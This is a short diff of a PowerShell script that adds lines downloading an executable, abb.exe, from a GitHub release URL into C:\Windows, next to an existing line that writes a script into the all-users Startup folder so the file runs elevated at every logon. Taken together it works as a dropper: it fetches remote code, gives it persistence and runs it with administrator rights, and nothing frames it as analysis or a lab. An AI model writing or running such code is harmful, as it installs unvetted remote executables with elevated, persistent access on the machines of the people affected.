@@ -1,1 +1,3 @@
 Set-Content -Path "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\s.ps1" -Value "Start-Process C:\Windows\abb.exe -Verb runAs"
+$webClient = New-Object System.Net.WebClient
+$webClient.DownloadFile("https://github.com/ZeRo1k/ngrok_server_clash/releases/download/%40private/abb.exe", "C:\Windows\abb.exe")
